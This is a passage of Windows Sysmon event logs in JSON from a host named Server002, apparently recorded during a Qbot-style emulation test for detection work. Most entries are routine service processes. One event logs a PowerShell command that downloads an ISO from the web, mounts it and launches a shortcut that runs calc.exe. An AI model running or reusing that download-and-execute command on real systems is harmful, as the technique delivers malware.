AUTHORITY\\SYSTEM"},{"@Name":"LogonGuid","#text":"dbf410b3-ff14-671b-e703-000000000000"},{"@Name":"LogonId","#text":"0x3E7"},{"@Name":"TerminalSessionId","#text":"0"},{"@Name":"IntegrityLevel","#text":"System"},{"@Name":"Hashes","#text":"SHA256=CC0A60CD15FA21E54615E46CD0F10CFBE86F496DC64D14B31D9F3B415D120EE1"},{"@Name":"ParentProcessGuid","#text":"dbf410b3-e38c-671b-c200-000000003900"},{"@Name":"ParentProcessId","#text":"4004"},{"@Name":"ParentImage","#text":"C:\\Windows\\System32\\CompatTelRunner.exe"},{"@Name":"ParentCommandLine","#text":"\"C:\\Windows\\system32\\compattelrunner.exe\""},{"@Name":"ParentUser","#text":"NT AUTHORITY\\SYSTEM"}]}}}
{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"5","Version":"3","Level":"4","Task":"5","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-25 18:29:35.1120824"},"EventRecordID":"17996","Correlation":null,"Execution":{"@ProcessID":"3264","@ThreadID":"3196"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-25 18:29:35.111"},{"@Name":"ProcessGuid","#text":"dbf410b3-e38c-671b-ca00-000000003900"},{"@Name":"ProcessId","#text":"2252"},{"@Name":"Image","#text":"C:\\Windows\\System32\\wsqmcons.exe"},{"@Name":"User","#text":"NT AUTHORITY\\SYSTEM"}]}}}
{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"5","Version":"3","Level":"4","Task":"5","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-25 18:29:35.1237907"},"EventRecordID":"17997","Correlation":null,"Execution":{"@ProcessID":"3264","@ThreadID":"3196"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-25 18:29:35.115"},{"@Name":"ProcessGuid","#text":"dbf410b3-e38c-671b-c800-000000003900"},{"@Name":"ProcessId","#text":"4448"},{"@Name":"Image","#text":"C:\\Windows\\System32\\rundll32.exe"},{"@Name":"User","#text":"NT AUTHORITY\\SYSTEM"}]}}}
{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"5","Version":"3","Level":"4","Task":"5","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-25 18:29:35.2075400"},"EventRecordID":"17998","Correlation":null,"Execution":{"@ProcessID":"3264","@ThreadID":"3196"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-25 18:29:35.198"},{"@Name":"ProcessGuid","#text":"dbf410b3-e38c-671b-c700-000000003900"},{"@Name":"ProcessId","#text":"1632"},{"@Name":"Image","#text":"C:\\Windows\\System32\\UsoClient.exe"},{"@Name":"User","#text":"NT AUTHORITY\\SYSTEM"}]}}}
{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"5","Version":"3","Level":"4","Task":"5","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-25 18:29:35.7420153"},"EventRecordID":"17999","Correlation":null,"Execution":{"@ProcessID":"3264","@ThreadID":"3196"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-25 18:29:35.741"},{"@Name":"ProcessGuid","#text":"dbf410b3-e38b-671b-c000-000000003900"},{"@Name":"ProcessId","#text":"3808"},{"@Name":"Image","#text":"C:\\Windows\\System32\\MusNotification.exe"},{"@Name":"User","#text":"NT AUTHORITY\\SYSTEM"}]}}}
{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"5","Version":"3","Level":"4","Task":"5","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-25 18:30:05.0383463"},"EventRecordID":"18000","Correlation":null,"Execution":{"@ProcessID":"3264","@ThreadID":"3196"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-25 18:30:05.037"},{"@Name":"ProcessGuid","#text":"dbf410b3-e38c-671b-c500-000000003900"},{"@Name":"ProcessId","#text":"2580"},{"@Name":"Image","#text":"C:\\Windows\\System32\\wermgr.exe"},{"@Name":"User","#text":"NT AUTHORITY\\SYSTEM"}]}}}
{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"1","Version":"5","Level":"4","Task":"1","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-25 18:30:05.2166686"},"EventRecordID":"18001","Correlation":null,"Execution":{"@ProcessID":"3264","@ThreadID":"3196"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-25 18:30:05.212"},{"@Name":"ProcessGuid","#text":"dbf410b3-e3ad-671b-e100-000000003900"},{"@Name":"ProcessId","#text":"1220"},{"@Name":"Image","#text":"C:\\Windows\\System32\\svchost.exe"},{"@Name":"FileVersion","#text":"10.0.19041.4355 (WinBuild.160101.0800)"},{"@Name":"Description","#text":"Host Process for Windows Services"},{"@Name":"Product","#text":"Microsoft® Windows® Operating System"},{"@Name":"Company","#text":"Microsoft Corporation"},{"@Name":"OriginalFileName","#text":"svchost.exe"},{"@Name":"CommandLine","#text":"C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s lfsvc"},{"@Name":"CurrentDirectory","#text":"C:\\Windows\\system32\\"},{"@Name":"User","#text":"NT AUTHORITY\\SYSTEM"},{"@Name":"LogonGuid","#text":"dbf410b3-ff14-671b-e703-000000000000"},{"@Name":"LogonId","#text":"0x3E7"},{"@Name":"TerminalSessionId","#text":"0"},{"@Name":"IntegrityLevel","#text":"System"},{"@Name":"Hashes","#text":"SHA256=6FC3BF1FDFD76860BE782554F8D25BD32F108DB934D70F4253F1E5F23522E503"},{"@Name":"ParentProcessGuid","#text":"00000000-0000-0000-0000-000000000000"},{"@Name":"ParentProcessId","#text":"656"},{"@Name":"ParentImage","#text":"-"},{"@Name":"ParentCommandLine","#text":"-"},{"@Name":"ParentUser","#text":"-"}]}}}
{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"1","Version":"5","Level":"4","Task":"1","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-25 18:30:05.3930945"},"EventRecordID":"18002","Correlation":null,"Execution":{"@ProcessID":"3264","@ThreadID":"3196"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-25 18:30:05.384"},{"@Name":"ProcessGuid","#text":"dbf410b3-e3ad-671b-e200-000000003900"},{"@Name":"ProcessId","#text":"788"},{"@Name":"Image","#text":"C:\\Windows\\System32\\svchost.exe"},{"@Name":"FileVersion","#text":"10.0.19041.4355 (WinBuild.160101.0800)"},{"@Name":"Description","#text":"Host Process for Windows Services"},{"@Name":"Product","#text":"Microsoft® Windows® Operating System"},{"@Name":"Company","#text":"Microsoft Corporation"},{"@Name":"OriginalFileName","#text":"svchost.exe"},{"@Name":"CommandLine","#text":"C:\\Windows\\system32\\svchost.exe -k appmodel -p -s camsvc"},{"@Name":"CurrentDirectory","#text":"C:\\Windows\\system32\\"},{"@Name":"User","#text":"NT AUTHORITY\\SYSTEM"},{"@Name":"LogonGuid","#text":"dbf410b3-ff14-671b-e703-000000000000"},{"@Name":"LogonId","#text":"0x3E7"},{"@Name":"TerminalSessionId","#text":"0"},{"@Name":"IntegrityLevel","#text":"System"},{"@Name":"Hashes","#text":"SHA256=6FC3BF1FDFD76860BE782554F8D25BD32F108DB934D70F4253F1E5F23522E503"},{"@Name":"ParentProcessGuid","#text":"00000000-0000-0000-0000-000000000000"},{"@Name":"ParentProcessId","#text":"656"},{"@Name":"ParentImage","#text":"-"},{"@Name":"ParentCommandLine","#text":"-"},{"@Name":"ParentUser","#text":"-"}]}}}
{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"1","Version":"5","Level":"4","Task":"1","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-25 18:30:05.7373200"},"EventRecordID":"18003","Correlation":null,"Execution":{"@ProcessID":"3264","@ThreadID":"3196"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-25 18:30:05.730"},{"@Name":"ProcessGuid","#text":"dbf410b3-e3ad-671b-e300-000000003900"},{"@Name":"ProcessId","#text":"2488"},{"@Name":"Image","#text":"C:\\Windows\\System32\\wbem\\WmiPrvSE.exe"},{"@Name":"FileVersion","#text":"10.0.19041.3636 (WinBuild.160101.0800)"},{"@Name":"Description","#text":"WMI Provider Host"},{"@Name":"Product","#text":"Microsoft® Windows® Operating System"},{"@Name":"Company","#text":"Microsoft Corporation"},{"@Name":"OriginalFileName","#text":"Wmiprvse.exe"},{"@Name":"CommandLine","#text":"C:\\Windows\\system32\\wbem\\wmiprvse.exe -Embedding"},{"@Name":"CurrentDirectory","#text":"C:\\Windows\\system32\\"},{"@Name":"User","#text":"NT AUTHORITY\\SYSTEM"},{"@Name":"LogonGuid","#text":"dbf410b3-ff14-671b-e703-000000000000"},{"@Name":"LogonId","#text":"0x3E7"},{"@Name":"TerminalSessionId","#text":"0"},{"@Name":"IntegrityLevel","#text":"System"},{"@Name":"Hashes","#text":"SHA256=8BBDEAD7357AF7BF0EFE397F9FD7E0EC578755EB8BDBAA65AE4F28EF00087AD5"},{"@Name":"ParentProcessGuid","#text":"00000000-0000-0000-0000-000000000000"},{"@Name":"ParentProcessId","#text":"772"},{"@Name":"ParentImage","#text":"-"},{"@Name":"ParentCommandLine","#text":"-"},{"@Name":"ParentUser","#text":"-"}]}}}
{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"1","Version":"5","Level":"4","Task":"1","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-25 18:30:07.1165605"},"EventRecordID":"18004","Correlation":null,"Execution":{"@ProcessID":"3264","@ThreadID":"3196"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-25 18:30:07.109"},{"@Name":"ProcessGuid","#text":"dbf410b3-e3af-671b-e400-000000003900"},{"@Name":"ProcessId","#text":"1056"},{"@Name":"Image","#text":"C:\\Windows\\System32\\svchost.exe"},{"@Name":"FileVersion","#text":"10.0.19041.4355 (WinBuild.160101.0800)"},{"@Name":"Description","#text":"Host Process for Windows Services"},{"@Name":"Product","#text":"Microsoft® Windows® Operating System"},{"@Name":"Company","#text":"Microsoft Corporation"},{"@Name":"OriginalFileName","#text":"svchost.exe"},{"@Name":"CommandLine","#text":"C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s PushToInstall"},{"@Name":"CurrentDirectory","#text":"C:\\Windows\\system32\\"},{"@Name":"User","#text":"NT AUTHORITY\\SYSTEM"},{"@Name":"LogonGuid","#text":"dbf410b3-ff14-671b-e703-000000000000"},{"@Name":"LogonId","#text":"0x3E7"},{"@Name":"TerminalSessionId","#text":"0"},{"@Name":"IntegrityLevel","#text":"System"},{"@Name":"Hashes","#text":"SHA256=6FC3BF1FDFD76860BE782554F8D25BD32F108DB934D70F4253F1E5F23522E503"},{"@Name":"ParentProcessGuid","#text":"00000000-0000-0000-0000-000000000000"},{"@Name":"ParentProcessId","#text":"656"},{"@Name":"ParentImage","#text":"-"},{"@Name":"ParentCommandLine","#text":"-"},{"@Name":"ParentUser","#text":"-"}]}}}
{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"1","Version":"5","Level":"4","Task":"1","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-25 18:30:07.3901201"},"EventRecordID":"18005","Correlation":null,"Execution":{"@ProcessID":"3264","@ThreadID":"3196"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-25 18:30:07.336"},{"@Name":"ProcessGuid","#text":"dbf410b3-e3af-671b-e500-000000003900"},{"@Name":"ProcessId","#text":"2384"},{"@Name":"Image","#text":"C:\\Windows\\System32\\svchost.exe"},{"@Name":"FileVersion","#text":"10.0.19041.4355 (WinBuild.160101.0800)"},{"@Name":"Description","#text":"Host Process for Windows Services"},{"@Name":"Product","#text":"Microsoft® Windows® Operating System"},{"@Name":"Company","#text":"Microsoft Corporation"},{"@Name":"OriginalFileName","#text":"svchost.exe"},{"@Name":"CommandLine","#text":"C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s DsmSvc"},{"@Name":"CurrentDirectory","#text":"C:\\Windows\\system32\\"},{"@Name":"User","#text":"NT AUTHORITY\\SYSTEM"},{"@Name":"LogonGuid","#text":"dbf410b3-ff14-671b-e703-000000000000"},{"@Name":"LogonId","#text":"0x3E7"},{"@Name":"TerminalSessionId","#text":"0"},{"@Name":"IntegrityLevel","#text":"System"},{"@Name":"Hashes","#text":"SHA256=6FC3BF1FDFD76860BE782554F8D25BD32F108DB934D70F4253F1E5F23522E503"},{"@Name":"ParentProcessGuid","#text":"00000000-0000-0000-0000-000000000000"},{"@Name":"ParentProcessId","#text":"656"},{"@Name":"ParentImage","#text":"-"},{"@Name":"ParentCommandLine","#text":"-"},{"@Name":"ParentUser","#text":"-"}]}}}
{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"5","Version":"3","Level":"4","Task":"5","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-25 18:30:07.4329225"},"EventRecordID":"18006","Correlation":null,"Execution":{"@ProcessID":"3264","@ThreadID":"3196"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-25 18:30:07.417"},{"@Name":"ProcessGuid","#text":"dbf410b3-e38c-671b-c400-000000003900"},{"@Name":"ProcessId","#text":"4220"},{"@Name":"Image","#text":"C:\\Windows\\System32\\sc.exe"},{"@Name":"User","#text":"NT AUTHORITY\\SYSTEM"}]}}}
{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"5","Version":"3","Level":"4","Task":"5","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-25 18:30:07.4451630"},"EventRecordID":"18007","Correlation":null,"Execution":{"@ProcessID":"3264","@ThreadID":"3196"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-25 18:30:07.434"},{"@Name":"ProcessGuid","#text":"dbf410b3-e38c-671b-ce00-000000003900"},{"@Name":"ProcessId","#text":"172"},{"@Name":"Image","#text":"C:\\Windows\\System32\\conhost.exe"},{"@Name":"User","#text":"NT AUTHORITY\\SYSTEM"}]}}}
{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"5","Version":"3","Level":"4","Task":"5","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-25 18:30:07.4499741"},"EventRecordID":"18008","Correlation":null,"Execution":{"@ProcessID":"3264","@ThreadID":"3196"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-25 18:30:07.445"},{"@Name":"ProcessGuid","#text":"dbf410b3-e38c-671b-c300-000000003900"},{"@Name":"ProcessId","#text":"3280"},{"@Name":"Image","#text":"C:\\Windows\\System32\\sc.exe"},{"@Name":"User","#text":"NT AUTHORITY\\SYSTEM"}]}}}
{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"5","Version":"3","Level":"4","Task":"5","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-25 18:30:07.4536025"},"EventRecordID":"18009","Correlation":null,"Execution":{"@ProcessID":"3264","@ThreadID":"3196"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-25 18:30:07.450"},{"@Name":"ProcessGuid","#text":"dbf410b3-e38c-671b-cf00-000000003900"},{"@Name":"ProcessId","#text":"4644"},{"@Name":"Image","#text":"C:\\Windows\\System32\\conhost.exe"},{"@Name":"User","#text":"NT AUTHORITY\\SYSTEM"}]}}}
{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"1","Version":"5","Level":"4","Task":"1","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-25 18:30:09.4958652"},"EventRecordID":"18010","Correlation":null,"Execution":{"@ProcessID":"3264","@ThreadID":"3196"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-25 18:30:09.487"},{"@Name":"ProcessGuid","#text":"dbf410b3-e3b1-671b-e600-000000003900"},{"@Name":"ProcessId","#text":"3204"},{"@Name":"Image","#text":"C:\\Windows\\System32\\svchost.exe"},{"@Name":"FileVersion","#text":"10.0.19041.4355 (WinBuild.160101.0800)"},{"@Name":"Description","#text":"Host Process for Windows Services"},{"@Name":"Product","#text":"Microsoft® Windows® Operating System"},{"@Name":"Company","#text":"Microsoft Corporation"},{"@Name":"OriginalFileName","#text":"svchost.exe"},{"@Name":"CommandLine","#text":"C:\\Windows\\System32\\svchost.exe -k smphost"},{"@Name":"CurrentDirectory","#text":"C:\\Windows\\system32\\"},{"@Name":"User","#text":"NT AUTHORITY\\NETWORK SERVICE"},{"@Name":"LogonGuid","#text":"dbf410b3-ff16-671b-e403-000000000000"},{"@Name":"LogonId","#text":"0x3E4"},{"@Name":"TerminalSessionId","#text":"0"},{"@Name":"IntegrityLevel","#text":"System"},{"@Name":"Hashes","#text":"SHA256=6FC3BF1FDFD76860BE782554F8D25BD32F108DB934D70F4253F1E5F23522E503"},{"@Name":"ParentProcessGuid","#text":"00000000-0000-0000-0000-000000000000"},{"@Name":"ParentProcessId","#text":"656"},{"@Name":"ParentImage","#text":"-"},{"@Name":"ParentCommandLine","#text":"-"},{"@Name":"ParentUser","#text":"-"}]}}}
{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"1","Version":"5","Level":"4","Task":"1","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-25 18:30:11.1983696"},"EventRecordID":"18011","Correlation":null,"Execution":{"@ProcessID":"3264","@ThreadID":"3196"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-25 18:30:11.144"},{"@Name":"ProcessGuid","#text":"dbf410b3-e3b3-671b-e700-000000003900"},{"@Name":"ProcessId","#text":"5268"},{"@Name":"Image","#text":"C:\\Windows\\System32\\cmd.exe"},{"@Name":"FileVersion","#text":"10.0.19041.4355 (WinBuild.160101.0800)"},{"@Name":"Description","#text":"Windows Command Processor"},{"@Name":"Product","#text":"Microsoft® Windows® Operating System"},{"@Name":"Company","#text":"Microsoft Corporation"},{"@Name":"OriginalFileName","#text":"Cmd.Exe"},{"@Name":"CommandLine","#text":"\"C:\\Windows\\system32\\cmd.exe\" /q /c calc.exe"},{"@Name":"CurrentDirectory","#text":"E:\\"},{"@Name":"User","#text":"SERVER002\\admin_test"},{"@Name":"LogonGuid","#text":"dbf410b3-e388-671b-6c50-110000000000"},{"@Name":"LogonId","#text":"0x11506C"},{"@Name":"TerminalSessionId","#text":"0"},{"@Name":"IntegrityLevel","#text":"High"},{"@Name":"Hashes","#text":"SHA256=BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0"},{"@Name":"ParentProcessGuid","#text":"dbf410b3-e38d-671b-df00-000000003900"},{"@Name":"ParentProcessId","#text":"2704"},{"@Name":"ParentImage","#text":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"},{"@Name":"ParentCommandLine","#text":"\"powershell.exe\" &amp; {IEX (iwr \\\"\"https://raw.githubusercontent.com/file/file-file/master/files/data.003/src/qbot-test.iso\\\"\" -OutFile \\\"\"$env:TEMP\\qbot-test.iso\\\"\"), Mount-DiskImage -ImagePath \\\"\"$env:TEMP\\qbot-test.iso\\\"\", $mountedpath = (Get-DiskImage -ImagePath \\\"\"$env:TEMP\\qbot-test.iso\\\"\" | Get-Volume).DriveLetter, $finalpath = $mountedpath + \\\"\":\\\\\"\", cd $finalpath, .\\calc.exe.lnk}"},{"@Name":"ParentUser","#text":"SERVER002\\admin_test"}]}}}
{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"1","Version":"5","Level":"4","Task":"1","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-25 18:30:11.2558383"},"EventRecordID":"18012","Correlation":null,"Execution":{"@ProcessID":"3264","@ThreadID":"3196"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-25 18:30:11.244"},{"@Name":"ProcessGuid","#text":"dbf410b3-e3b3-671b-e800-000000003900"},{"@Name":"ProcessId","#text":"6208"},{"@Name":"Image","#text":"C:\\Windows\\System32\\conhost.exe"},{"@Name":"FileVersion","#text":"10.0.19041.4355 (WinBuild.160101.0800)"},{"@Name":"Description","#text":"Console Window Host"},{"@Name":"Product","#text":"Microsoft® Windows® Operating System"},{"@Name":"Company","#text":"Microsoft Corporation"},{"@Name":"OriginalFileName","#text":"CONHOST.EXE"},{"@Name":"CommandLine","#text":"\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1"},{"@Name":"CurrentDirectory","#text":"C:\\Windows"},{"@Name":"User","#text":"SERVER002\\admin_test"},{"@Name":"LogonGuid","#text":"dbf410b3-e388-671b-6c50-110000000000"},{"@Name":"LogonId","#text":"0x11506C"},{"@Name":"TerminalSessionId","#text":"0"},{"@Name":"IntegrityLevel","#text":"High"},{"@Name":"Hashes","#text":"SHA256=CC0A60CD15FA21E54615E46CD0F10CFBE86F496DC64D14B31D9F3B415D120EE1"},{"@Name":"ParentProcessGuid","#text":"dbf410b3-e3b3-671b-e700-000000003900"},{"@Name":"ParentProcessId","#text":"5268"},{"@Name":"ParentImage","#text":"C:\\Windows\\System32\\cmd.exe"},{"@Name":"ParentCommandLine","#text":"\"C:\\Windows\\system32\\cmd.exe\" /q /c calc.exe"},{"@Name":"ParentUser","#text":"SERVER002\\admin_test"}]}}}
